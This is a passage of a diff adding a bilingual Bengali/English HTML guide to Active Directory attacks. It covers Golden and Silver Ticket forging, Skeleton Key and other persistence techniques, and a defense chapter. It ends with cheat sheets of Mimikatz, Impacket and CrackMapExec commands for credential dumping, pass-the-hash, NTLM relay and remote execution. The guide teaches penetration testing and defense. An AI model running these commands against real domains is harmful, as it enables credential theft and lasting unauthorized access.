+<span class="p">mimikatz#</span> kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_HASH /ptt
+
+<span class="c"># Step 3: যেকোনো machine-এ access</span>
+<span class="p">mimikatz#</span> misc::cmd
+<span class="p">C:\></span> dir \\DC01\C$    <span class="c"># DC-তে access!</span>
+
+<span class="c"># Linux (Impacket)</span>
+<span class="p">$</span> impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXX -domain corp.local administrator
+<span class="p">$</span> export KRB5CCNAME=administrator.ccache
+<span class="p">$</span> impacket-psexec -k -no-pass corp.local/administrator@DC01.corp.local
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Silver Ticket</span><span class="en-text">Silver Ticket</span></h2>
+    <div class="code">
+<span class="c"># Service account hash দিয়ে specific service-এর জন্য ticket</span>
+<span class="p">mimikatz#</span> kerberos::golden /user:administrator /domain:corp.local /sid:DOMAIN_SID /target:server.corp.local /service:cifs /rc4:SERVICE_HASH /ptt
+<span class="c"># CIFS = file sharing, HTTP = web, MSSQL = SQL Server, HOST = remote management</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Domain Compromise Checklist</span><span class="en-text">Domain Compromise Checklist</span></h2>
+    <div class="grid2">
+      <div class="card g-card">
+        <h4>✅ <span class="bn-text">Domain Admin পাওয়ার পর করণীয়</span><span class="en-text">What to Do After Getting Domain Admin</span></h4>
+        <ol style="font-size:12.5px;">
+          <li><span class="bn-text">KRBTGT hash dump (Golden Ticket)</span><span class="en-text">Dump KRBTGT hash (Golden Ticket)</span></li>
+          <li><span class="bn-text">সব user hash dump (secretsdump)</span><span class="en-text">Dump all user hashes (secretsdump)</span></li>
+          <li><span class="bn-text">Evidence collect (screenshot, log)</span><span class="en-text">Collect evidence (screenshots, logs)</span></li>
+          <li><span class="bn-text">Impact demonstrate করো</span><span class="en-text">Demonstrate impact</span></li>
+          <li><span class="bn-text">Clean up করো</span><span class="en-text">Clean up</span></li>
+          <li><span class="bn-text">Report লেখো</span><span class="en-text">Write report</span></li>
+        </ol>
+      </div>
+      <div class="card b-card">
+        <h4>📋 <span class="bn-text">এই কমান্ডগুলো মনে রাখো</span><span class="en-text">Remember These Commands</span></h4>
+        <ul style="font-size:12px; font-family:'Fira Code',monospace;">
+          <li>secretsdump → all hashes</li>
+          <li>kerberos::golden → persistence</li>
+          <li>lsadump::dcsync → KRBTGT</li>
+          <li>sekurlsa::logonpasswords</li>
+          <li>bloodhound-python → map</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- CH 10: PERSISTENCE -->
+<div class="chapter ch10">
+  <div class="chapter-header" data-num="10">
+    <div class="ch-label">CHAPTER 10</div>
+    <div class="ch-title">🕳️ <span class="bn-text">Persistence — AD-তে টিকে থাকা</span><span class="en-text">Persistence — Staying in AD</span></div>
+    <div class="ch-desc"><span class="bn-text">Password reset হলেও access না হারানোর কৌশল</span><span class="en-text">Techniques for maintaining access even if passwords are reset</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Golden Ticket Persistence</span><span class="en-text">Golden Ticket Persistence</span></h2>
+    <p><span class="bn-text">Golden Ticket বাতিল করতে KRBTGT password দুইবার reset করতে হয়। তাই এটাই সবচেয়ে দীর্ঘস্থায়ী persistence।</span><span class="en-text">To invalidate a Golden Ticket, the KRBTGT password must be reset twice. That's why it's the most persistent form of access.</span></p>
+
+    <h2 class="sec"><span class="bn-text">Skeleton Key</span><span class="en-text">Skeleton Key</span></h2>
+    <div class="code">
+<span class="c"># DC-তে Skeleton Key inject করো</span>
+<span class="c"># এরপর যেকোনো user-এর password হিসেবে "mimikatz" কাজ করবে!</span>
+<span class="p">mimikatz#</span> misc::skeleton
+<span class="c"># এখন: net use \\DC01\C$ /user:admin mimikatz → কাজ করবে!</span>
+<span class="c"># Reboot হলে চলে যায়</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">AD Persistence Techniques</span><span class="en-text">AD Persistence Techniques</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">কৌশল</span><span class="en-text">Technique</span></th>
+        <th><span class="bn-text">কীভাবে</span><span class="en-text">How</span></th>
+        <th><span class="bn-text">স্থায়িত্ব</span><span class="en-text">Persistence</span></th>
+        <th><span class="bn-text">Detect করা</span><span class="en-text">Detection</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Golden Ticket</strong></td><td>KRBTGT hash</td><td><span class="badge badge-r">10 years</span></td><td><span class="badge badge-g">Difficult</span></td></tr>
+        <tr><td><strong>Silver Ticket</strong></td><td>Service hash</td><td><span class="badge badge-y">Service lifetime</span></td><td><span class="badge badge-g">Very hard</span></td></tr>
+        <tr><td><strong>Skeleton Key</strong></td><td>LSASS patch</td><td><span class="badge badge-g">Until reboot</span></td><td><span class="badge badge-r">Easy</span></td></tr>
+        <tr><td><strong>AdminSDHolder</strong></td><td>ACL abuse</td><td><span class="badge badge-r">Permanent</span></td><td><span class="badge badge-y">Medium</span></td></tr>
+        <tr><td><strong>DCSync Rights</strong></td><td>ACL grant</td><td><span class="badge badge-r">Permanent</span></td><td><span class="badge badge-y">Medium</span></td></tr>
+        <tr><td><strong>New DA account</strong></td><td>Add user</td><td><span class="badge badge-r">Until found</span></td><td><span class="badge badge-r">Easy</span></td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- CH 11: DEFENSE -->
+<div class="chapter ch11">
+  <div class="chapter-header" data-num="11">
+    <div class="ch-label">CHAPTER 11</div>
+    <div class="ch-title">🛡️ <span class="bn-text">AD Security — রক্ষার উপায়</span><span class="en-text">AD Security — How to Defend</span></div>
+    <div class="ch-desc"><span class="bn-text">Attack জানলে defense করাও জানতে হবে — Blue Team-এর জন্য</span><span class="en-text">Knowing the attacks means knowing the defense — for the Blue Team</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Tiering Model — সবচেয়ে গুরুত্বপূর্ণ</span><span class="en-text">Tiering Model — Most Important</span></h2>
+    <div class="ad-diagram">
+<span class="ad-r">Tier 0:</span> Domain Controllers, PKI, ADFS
+  → <span class="bn-text">শুধু Tier 0 admin login করতে পারবে</span><span class="en-text">Only Tier 0 admins can log in</span>
+  → <span class="bn-text">Internet access নেই</span><span class="en-text">No internet access</span>
+
+<span class="ad-y">Tier 1:</span> Member Servers (File, SQL, Exchange)
+  → <span class="bn-text">Tier 1 admin — Tier 0-তে login করতে পারবে না</span><span class="en-text">Tier 1 admin — cannot log into Tier 0</span>
+
+<span class="ad-g">Tier 2:</span> Workstations, Laptops
+  → <span class="bn-text">Normal user — শুধু নিজের workstation</span><span class="en-text">Normal user — only their own workstation</span>
+
+<span class="ad-d">Rule:</span> Higher tier admin lower tier-এ login করতে পারবে না
+<span class="bn-text">এই rule ভাঙলেই Lateral Movement সহজ হয়!</span><span class="en-text">Breaking this rule makes Lateral Movement easy!</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">আক্রমণ অনুযায়ী Defense</span><span class="en-text">Defense by Attack Type</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">আক্রমণ</span><span class="en-text">Attack</span></th>
+        <th><span class="bn-text">প্রতিরোধ</span><span class="en-text">Prevention</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td>Kerberoasting</td><td><span class="bn-text">Service account-এ long, complex password; Managed Service Accounts (MSA)</span><span class="en-text">Long, complex passwords on service accounts; use Managed Service Accounts (MSA)</span></td></tr>
+        <tr><td>ASREPRoasting</td><td><span class="bn-text">সব user-এ Kerberos Preauth চালু রাখো</span><span class="en-text">Enable Kerberos Preauth on all users</span></td></tr>
+        <tr><td>Pass-the-Hash</td><td><span class="bn-text">Protected Users group, Credential Guard, LAPS</span><span class="en-text">Protected Users group, Credential Guard, LAPS</span></td></tr>
+        <tr><td>Golden Ticket</td><td><span class="bn-text">KRBTGT password প্রতি ৬ মাসে reset করো (দুইবার)</span><span class="en-text">Reset KRBTGT password every 6 months (twice)</span></td></tr>
+        <tr><td>DCSync</td><td><span class="bn-text">DCSync rights audit করো; শুধু DC-দের থাকা উচিত</span><span class="en-text">Audit DCSync rights; only DCs should have them</span></td></tr>
+        <tr><td>NTLM Relay</td><td>SMB Signing চালু করো; NTLM restrict করো</td></tr>
+        <tr><td>BloodHound paths</td><td><span class="bn-text">Unnecessary ACLs সরাও; Admin তৈরিতে যত্নশীল হও</span><span class="en-text">Remove unnecessary ACLs; be careful when creating admins</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec">LAPS — Local Admin Password Solution</h2>
+    <div class="code">
+<span class="c"># LAPS install করো — প্রতিটা machine-এ আলাদা random local admin password</span>
+<span class="p">PS></span> Install-Module -Name LAPS
+<span class="p">PS></span> Update-AdmPwdADSchema
+<span class="p">PS></span> Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=corp,DC=local"
+
+<span class="c"># LAPS password দেখা (privileged user)</span>
+<span class="p">PS></span> Get-AdmPwdPassword -ComputerName PC01
+
+<span class="c"># Monitoring — Event IDs মনে রাখো</span>
+<span class="c"># 4768 — Kerberos TGT request (Kerberoasting detect)</span>
+<span class="c"># 4769 — Kerberos TGS request</span>
+<span class="c"># 4672 — Special privileges assigned</span>
+<span class="c"># 4624 — Successful logon</span>
+<span class="c"># 4625 — Failed logon</span>
+<span class="c"># 4648 — Explicit credential logon (PtH indicator)</span>
+<span class="c"># 4776 — NTLM authentication</span>
+    </div>
+  </div>
+</div>
+
+<!-- CH 12: CHEAT SHEET -->
+<div class="chapter ch12">
+  <div class="chapter-header" data-num="12">
+    <div class="ch-label">CHAPTER 12</div>
+    <div class="ch-title">📋 <span class="bn-text">Cheat Sheet — সম্পূর্ণ রেফারেন্স</span><span class="en-text">Cheat Sheet — Complete Reference</span></div>
+    <div class="ch-desc"><span class="bn-text">BloodHound, Mimikatz, Impacket, CrackMapExec, PowerView — সব কমান্ড</span><span class="en-text">BloodHound, Mimikatz, Impacket, CrackMapExec, PowerView — all commands</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🩸 BloodHound / SharpHound</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#0078d4; color:#fff;">Data Collection</div>
+        <div class="cheat-row"><span class="cheat-cmd">.\SharpHound.exe -c All</span><span class="cheat-desc"><span class="bn-text">সব data collect</span><span class="en-text">Collect all data</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">.\SharpHound.exe -c DCOnly</span><span class="cheat-desc">DC data only</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">bloodhound-python -u u -p p -d d -c All</span><span class="cheat-desc">Linux collector</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">bloodhound-python ... --zip</span><span class="cheat-desc">ZIP output</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#d97706; color:#fff;">Key Queries</div>
+        <div class="cheat-row"><span class="cheat-cmd">Find Shortest Path to DA</span><span class="cheat-desc"><span class="bn-text">DA পথ</span><span class="en-text">DA path</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">Find Kerberoastable Accounts</span><span class="cheat-desc">SPNs</div></div>
+        <div class="cheat-row"><span class="cheat-cmd">Find AS-REP Roastable Users</span><span class="cheat-desc">No preauth</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">Find DCSync Rights</span><span class="cheat-desc">DCSync abuse</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🔓 Mimikatz Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#e02424; color:#fff;">Credential Dump</div>
+        <div class="cheat-row"><span class="cheat-cmd">privilege::debug</span><span class="cheat-desc"><span class="bn-text">Debug privilege</span><span class="en-text">Get debug privilege</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sekurlsa::logonpasswords</span><span class="cheat-desc"><span class="bn-text">All creds</span><span class="en-text">All credentials</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sekurlsa::tickets /export</span><span class="cheat-desc">Kerberos tickets</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">lsadump::sam</span><span class="cheat-desc">SAM database</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">lsadump::secrets</span><span class="cheat-desc">LSA Secrets</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">lsadump::dcsync /user:krbtgt</span><span class="cheat-desc">DCSync</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#7e3af2; color:#fff;">Golden/Silver Ticket</div>
+        <div class="cheat-row"><span class="cheat-cmd">kerberos::golden /user:admin /domain:d /sid:S /krbtgt:H /ptt</span><span class="cheat-desc">Golden Ticket</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">kerberos::silver /target:srv /service:cifs /rc4:H /ptt</span><span class="cheat-desc">Silver Ticket</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sekurlsa::pth /user:u /domain:d /ntlm:H /run:cmd</span><span class="cheat-desc">Pass-the-Hash</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">kerberos::ptt ticket.kirbi</span><span class="cheat-desc">Pass-the-Ticket</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">misc::skeleton</span><span class="cheat-desc">Skeleton Key</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">📦 Impacket Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#0e9f6e; color:#fff;">Remote Execution</div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-psexec d/u:p@IP</span><span class="cheat-desc">SMB exec</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-wmiexec d/u:p@IP</span><span class="cheat-desc">WMI exec</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-smbexec d/u:p@IP</span><span class="cheat-desc">SMB exec v2</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">evil-winrm -i IP -u u -p p</span><span class="cheat-desc">WinRM shell</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-psexec d/u@IP -hashes :HASH</span><span class="cheat-desc">PtH</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#1a56db; color:#fff;">Credential &amp; Ticket</div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-secretsdump d/u:p@DC</span><span class="cheat-desc"><span class="bn-text">Hash dump</span><span class="en-text">Hash dump</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-GetUserSPNs d/u:p -dc-ip IP -request</span><span class="cheat-desc">Kerberoast</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-GetNPUsers d/ -usersfile u.txt -dc-ip IP</span><span class="cheat-desc">ASREPRoast</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-ticketer -nthash KRBTGT_H -domain-sid SID -domain d admin</span><span class="cheat-desc">Golden</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">impacket-ntlmrelayx -tf targets.txt -smb2support</span><span class="cheat-desc">NTLM Relay</span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">⚡ CrackMapExec Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#e02424; color:#fff;">SMB Commands</div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb IP -u u -p p --users</span><span class="cheat-desc"><span class="bn-text">User list</span><span class="en-text">User list</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb IP -u u -p p --groups</span><span class="cheat-desc">Group list</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb IP -u u -p p --shares</span><span class="cheat-desc">Share list</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb IP -u u -p p --sam</span><span class="cheat-desc">SAM dump</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb CIDR -u u -H HASH</span><span class="cheat-desc">PtH subnet</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb IP -u u -p p -x "cmd"</span><span class="cheat-desc">Execute cmd</span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-head" style="background:#7e3af2; color:#fff;">Other Services</div>
+        <div class="cheat-row"><span class="cheat-cmd">cme winrm IP -u u -p p</span><span class="cheat-desc">WinRM check</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme ssh IP -u u -p p</span><span class="cheat-desc">SSH check</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme rdp IP -u u -p p</span><span class="cheat-desc">RDP check</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb IP -u u -p p --lsa</span><span class="cheat-desc">LSA Secrets</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">cme smb IP -u u -p p --pass-pol</span><span class="cheat-desc"><span class="bn-text">Password policy</span><span class="en-text">Password policy</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Practice Lab Resources</span><span class="en-text">Practice Lab Resources</span></h2>
+    <table>
+      <thead><tr>
+        <th>Platform</th>
+        <th><span class="bn-text">ধরন</span><span class="en-text">Type</span></th>
+        <th><span class="bn-text">বিবরণ</span><span class="en-text">Description</span></th>
+        <th>Link</th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>TryHackMe</strong></td><td><span class="badge badge-g">Online</span></td><td><span class="bn-text">AD rooms: Attacktive Directory, VulnNet</span><span class="en-text">AD rooms: Attacktive Directory, VulnNet</span></td><td>tryhackme.com</td></tr>
+        <tr><td><strong>HackTheBox</strong></td><td><span class="badge badge-b">Online</span></td><td>Forest, Active, Sauna, Monteverde</td><td>hackthebox.com</td></tr>
+        <tr><td><strong>GOAD</strong></td><td><span class="badge badge-y">Local</span></td><td><span class="bn-text">Game of AD — local AD lab setup</span><span class="en-text">Game of AD — local AD lab setup</span></td><td>GitHub/Orange-Cyberdefense</td></tr>
+        <tr><td><strong>VulnAD</strong></td><td><span class="badge badge-y">Local</span></td><td><span class="bn-text">Vulnerable AD setup script</span><span class="en-text">Vulnerable AD setup script</span></td><td>GitHub/WazeHell</td></tr>
+        <tr><td><strong>PentestLab</strong></td><td><span class="badge badge-p">Online</span></td><td>AD attack walkthroughs</td><td>pentesterlab.com</td></tr>
+      </tbody>
+    </table>
+
+    <div style="text-align:center; margin-top:50px; padding:30px; background:var(--code-bg); border-radius:8px; border-top:4px solid #0078d4;">
+      <div style="font-family:'Fira Code',monospace; font-size:15px; color:#cdd6f4; margin-bottom:10px;">
+        <span style="color:#0078d4;">PS C:\></span> Get-ADGroupMember "Domain Admins"
+      </div>
+      <div style="font-family:'Fira Code',monospace; font-size:13px; color:#50fa7b;">
+        [+] <span class="bn-text">তুমি এখন AD বোঝো। Ethical hacking-এ ব্যবহার করো।</span><span class="en-text">You now understand AD. Use it for ethical hacking.</span>
+      </div>
+      <p style="color:rgba(160,185,215,0.4); font-size:12px; margin-top:14px; max-width:580px; margin-left:auto; margin-right:auto;">
+        <span class="bn-text">সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে। Authorized pentest environment ছাড়া কোথাও ব্যবহার করো না।</span>
+        <span class="en-text">Entirely educational. Do not use outside of authorized pentest environments.</span>
+      </p>
+      <p style="margin-top:10px; font-size:10px; color:rgba(0,120,212,0.35); font-family:'Fira Code',monospace;">
+        v1.0 — Active Directory &amp; Windows Hacking | Bilingual | 12 Chapters + Cheat Sheet
+      </p>
+    </div>
+  </div>
+</div>
+
+<script>
+const body = document.body;
+body.classList.add('light-mode');
+
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode', 'dark-mode');
+    btn.textContent = '☀️ Light';
+    localStorage.setItem('theme', 'dark');
+  } else {
+    body.classList.replace('dark-mode', 'light-mode');
+    btn.textContent = '🌙 Dark';
+    localStorage.setItem('theme', 'light');
+  }
+}
+
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English';
+    localStorage.setItem('lang', 'bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা';
+    localStorage.setItem('lang', 'en');
+  }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+  const t = localStorage.getItem('theme');
+  const l = localStorage.getItem('lang');
+  if (t === 'dark') {
+    body.classList.replace('light-mode', 'dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) btn.textContent = '☀️ Light';
+  }
+  if (l === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) btn.textContent = '🇧🇩 বাংলা';
+  }
+});
+</script>
+</body>
+</html>
